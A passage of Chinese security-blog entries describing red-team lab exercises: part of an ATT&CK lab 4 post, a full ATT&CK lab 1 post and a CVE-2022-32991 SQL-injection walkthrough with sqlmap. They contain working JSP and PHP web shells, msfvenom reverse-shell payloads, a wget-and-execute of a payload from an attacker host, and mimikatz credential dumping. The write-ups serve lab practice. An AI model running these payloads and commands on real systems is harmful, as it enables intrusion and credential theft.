class="hljs-name">HTML</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BODY</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">FORM</span> <span class="hljs-attr">METHOD</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">NAME</span>=<span class="hljs-string">&quot;myform&quot;</span> <span class="hljs-attr">ACTION</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">INPUT</span> <span class="hljs-attr">TYPE</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">NAME</span>=<span class="hljs-string">&quot;cmd&quot;</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">INPUT</span> <span class="hljs-attr">TYPE</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">VALUE</span>=<span class="hljs-string">&quot;Send&quot;</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">FORM</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span></span><br><span class="language-xml"> </span><span class="language-vbscript">&lt;%</span><br><span class="language-vbscript"> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;</span><br><span class="language-vbscript">         out.println(<span class="hljs-string">&quot;Command: &quot;</span> + <span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) + <span class="hljs-string">&quot;\n&lt;BR&gt;&quot;</span>);</span><br><span class="language-vbscript">         Process p = Runtime.getRun<span class="hljs-built_in">time</span>().exec(<span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));</span><br><span class="language-vbscript">         OutputStream os = p.getOutputStream();</span><br><span class="language-vbscript">         InputStream <span class="hljs-keyword">in</span> = p.getInputStream();</span><br><span class="language-vbscript">         DataInputStream dis = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">in</span>);</span><br><span class="language-vbscript">         String disr = dis.readLine();</span><br><span class="language-vbscript">         <span class="hljs-keyword">while</span> ( disr != <span class="hljs-literal">null</span> ) &#123;</span><br><span class="language-vbscript">                 out.println(disr); disr = dis.readLine(); &#125;</span><br><span class="language-vbscript">         &#125;</span><br><span class="language-vbscript"> %&gt;</span><span class="language-xml"></span><br><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">BODY</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">HTML</span>&gt;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/13.jpg" class=""><h3 id="访问木马所在文件">访问木马所在文件</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.12.135:2002/shell.jsp</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/15.jpg" class=""><h3 id="执行命令">执行命令</h3><p>可以在输入框中输入命令</p><h2 id="msf提权">msf提权</h2><h3 id="生成木马">生成木马</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.12.135 <span class="hljs-attribute">LPORT</span>=6666 -f elf &gt; shell.elf<br></code></pre></td></tr></table></figure><p>搭建简易站点</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/16.jpg" class=""><h3 id="msf侦听">msf侦听</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> lhost 192.168.12.130<br><span class="hljs-built_in">set</span> lport 6666<br><span class="hljs-built_in">set</span> payload linux/x86/meterpreter/reverse_tcp<br>run<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/17.jpg" class=""><p>在shell.jsp上执行</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">wget <span class="hljs-keyword">http</span>://<span class="hljs-number">192.168</span><span class="hljs-number">.12</span><span class="hljs-number">.130</span>:<span class="hljs-number">9966</span>/<span class="hljs-built_in">shell</span>.elf<br>chmod <span class="hljs-number">777</span> <span class="hljs-built_in">shell</span>.elf<br>./<span class="hljs-built_in">shell</span>.elf<br></code></pre></td></tr></table></figure><p>成功在msf上拿到shell权限</p>]]></content>
    
    
    <categories>
      
      <category>红队靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ATT&amp;CK红队评估实战靶场1</title>
    <link href="/2024/02/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/"/>
    <url>/2024/02/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/</url>
    
    <content type="html"><![CDATA[<h1>初探外网</h1><p>1、访问web服务器win7的模拟外网ip——192.168.254.130</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.1.jpg" class=""><p>2、发现后台地址和密码，登录</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.2.jpg" class=""><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.3.jpg" class="" title="% 3、修改php文件，写入webshell <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[whoami]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure> 注意，需要修改在第一行，原来写在第二行，无法通过蚁剑连接 {% asset_img 1.15.jpg"><p>4、找到文件目录，即路径</p><p>通过御剑进行后台扫描。随便点击一个url，发现存在目录遍历漏洞，耐心找到修改的acomment.php所在位置。</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.5.jpg" class=""><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.6.jpg" class=""><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.9.jpg" class=""><p>5、通过蚁剑连接，密码：whoami，另外要选择编码方式</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.16.jpg" class=""><p>注：另一种连接方法为另写一个shell.php文件，内容为“<?php @eval($_POST["123"]);?>”，则连接密码为123，但是这种登录方式在下面的信息搜集过程中会出问题。</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.7.jpg" class=""><h1>进入内网</h1><h2 id="信息搜集">信息搜集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.17.jpg" class=""><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span><span class="hljs-title">查看本机用户列表</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.18.jpg" class=""><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span>查看域用户<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.19.jpg" class=""><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators查看本地管理员组（通常会有域用户）<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.20.jpg" class=""><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">/doamin</span>查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.21.jpg" class=""><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> computers<span class="hljs-string">&quot; /domain查看域中的其他主机名</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.22.jpg" class=""><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">group</span> &quot;domain admins&quot; /<span class="hljs-keyword">domain</span>查看域管理员的名字<br>net <span class="hljs-keyword">group</span> &quot;domain controllers&quot; /<span class="hljs-keyword">domain</span>查看域控制器（可能有多台）<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.23.jpg" class=""><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">route <span class="hljs-built_in">print</span>路由信息<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.24.jpg" class=""><p><strong>收集到的关键信息</strong>：<a href="http://xn--god-c88d89xw6fun0i.org">该域名为god.org</a>，域控为<code>OWA$</code>，域管理员为<code>Administrator</code>，内网网段为192.168.52.1/24，我们用Ping命令探测域控的ip→可知域控ip为192.168.52.138</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-built_in">ping</span> owa.god<span class="hljs-meta">.org</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.25.jpg" class=""><h2 id="添加组成员">添加组成员</h2><p>在win7本地主机创建一个whoami用户，并加入到管理员组中</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.26.jpg" class=""><h2 id="远程准备">远程准备</h2><p>然后设法远程桌面登录，查看3389是否开启：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">netstat -ano | find <span class="hljs-string">&quot;3389&quot;</span><br>若未开启：<br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.27.jpg" class=""><h2 id="kali生成shell-exe">kali生成shell.exe</h2><p><a href="https://blog.csdn.net/haqiang555/article/details/102676735">https://blog.csdn.net/haqiang555/article/details/102676735</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=你kali的IP <span class="hljs-attribute">LPORT</span>=随便一个端口 -f exe -o shell.exe)<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.254.132 <span class="hljs-attribute">LPORT</span>=4444 -f exe -o shell.exe<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.28.jpg" class=""><p>利用蚁剑上传到win7：</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.29.jpg" class=""><h2 id="监听">监听</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-number">1</span>、启动msfconsole：msfconsole<br><span class="hljs-number">2</span>、开启监听：use exploit/multi/handler<br><span class="hljs-number">3</span>、设置tcp监听：<span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br>4、<span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.254.132</span><br>5、开始监听：exploit<br>6、运行shell.exe<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.31.jpg" class=""><p>成功上线</p><h2 id="提权">提权</h2><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.32.jpg" class=""><p>关闭防火墙：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">run</span><span class="language-bash"> post/windows/manage/enable_rdp</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.33.jpg" class=""><p>打开远程桌面：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdestokpot</span> <span class="hljs-number">192.168.254.130</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.34.jpg" class=""><p>抓hash：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">meterpreter</span> &gt; hashdump<br></code></pre></td></tr></table></figure><p>若失败，则用msf自带的模块进行hash抓取</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">meterpreter &gt; <span class="hljs-keyword">run</span><span class="language-bash"> post/windows/gather/smart_hashdump</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.35.jpg" class=""><p>加载mimikatz模块：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">meterpreter &gt; <span class="hljs-keyword">load</span> mimikatz<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.36.jpg" class=""><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kiwi_cmd</span> privilege::<span class="hljs-literal">debug</span>进行权限提升<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.37.jpg" class=""><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure><p>报错，解决：进程迁移</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.38.jpg" class=""><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">getpid   当前pid<br>ps   查看所有进程<span class="hljs-built_in">id</span><br>migrate xxx(某个系统进程的<span class="hljs-built_in">id</span>)    进程迁移<br>再次执行：kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.39.jpg" class=""><p>此时我们已经获取到了administrator（域管理员）的明文密码——Liu78963</p><h1>横向移动</h1><p>进一步渗透入内网，对域中的其他主机进行渗透</p><p>1、探测内网存活主机</p><p>（在kali的远程控制桌面下执行，以下为windows命令）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">52</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span>   用Ping命令探测内网主机<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.40.jpg" class=""><p>探测到一台内网主机，ip为192.168.52.141。我们添加一下路由，对该主机进行渗透</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute -s 192.168.52.0/24<br><span class="hljs-built_in">run</span> autoroute -p<br>background<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.41.jpg" class=""><p>探测是否存在ms17_010：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-keyword">set</span> rhosts 192.168.52.141<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.42.jpg" class=""><p>发现存在漏洞，尝试攻击</p><p>报错：[-] 192.168.52.141:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets</p><p>使用模块1：use 1</p><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.43.jpg" class=""><img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.44.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>红队靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cve-2022-32991</title>
    <link href="/2024/02/24/cve-2022-32991/"/>
    <url>/2024/02/24/cve-2022-32991/</url>
    
    <content type="html"><![CDATA[<h1>CVE-2022-32991细节</h1><p>基于 Web 的测验系统 v1.0 被发现包含 SQL 注入漏洞，通过 welcome.php 的 eid 参数</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64; rv:<span class="hljs-number">102</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">102</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">Cookie</span>: Hm_lvt_2d0601bd28de7d49818249cf35d95943=<span class="hljs-number">1669477753</span>; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=<span class="hljs-number">1669477753</span>; PHPSESSID=ucd90ppkje49ml1sn8u91mp0f5<br></code></pre></td></tr></table></figure><h1>注册</h1><img src="/2024/02/24/cve-2022-32991/32991.1.jpg" class=""><h1>sqlmap攻击</h1><p>验证eid</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap -u <span class="hljs-string">&quot;http://eci-2zeaizw4us5acf1c8rjs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;eid&quot;</span> <span class="hljs-attr">--user-agent</span>=<span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669477753; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669477753; PHPSESSID=ucd90ppkje49ml1sn8u91mp0f5&quot;</span> <span class="hljs-attr">--batch</span><br><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-32991/32991.2.png" class=""><p>爆破库</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap -u <span class="hljs-string">&#x27;http://eci-2zeaizw4us5acf1c8rjs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&#x27;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;eid&#x27;</span> <span class="hljs-attr">--user-agent</span>=<span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669477753; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669477753; PHPSESSID=ucd90ppkje49ml1sn8u91mp0f5&quot;</span> -batch <span class="hljs-attr">--dbs</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-32991/32991.3.png" class=""><p>爆破表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap -u <span class="hljs-string">&#x27;http://eci-2zeaizw4us5acf1c8rjs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&#x27;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;eid&#x27;</span> <span class="hljs-attr">--user-agent</span>=<span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669477753; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669477753; PHPSESSID=ucd90ppkje49ml1sn8u91mp0f5&quot;</span> -batch -D ctf <span class="hljs-attr">--tables</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-32991/32991.4.png" class=""><p>爆破列</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap -u <span class="hljs-string">&#x27;http://eci-2zeaizw4us5acf1c8rjs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&#x27;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;eid&#x27;</span> <span class="hljs-attr">--user-agent</span>=<span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669477753; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669477753; PHPSESSID=ucd90ppkje49ml1sn8u91mp0f5&quot;</span> -batch -D ctf -T flag <span class="hljs-attr">--columns</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-32991/32991.5.png" class=""><p>爆破字段</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap -u <span class="hljs-string">&#x27;http://eci-2zeaizw4us5acf1c8rjs.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&#x27;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;eid&#x27;</span> <span class="hljs-attr">--user-agent</span>=<span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669477753; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669477753; PHPSESSID=ucd90ppkje49ml1sn8u91mp0f5&quot;</span> -batch -D ctf -T flag -C flag <span class="hljs-attr">--dump</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-32991/32991.6.png" class="">]]></content>
    
    
    <categories>
      
      <category>春秋云镜-cve</category>
      
    </categories>
    
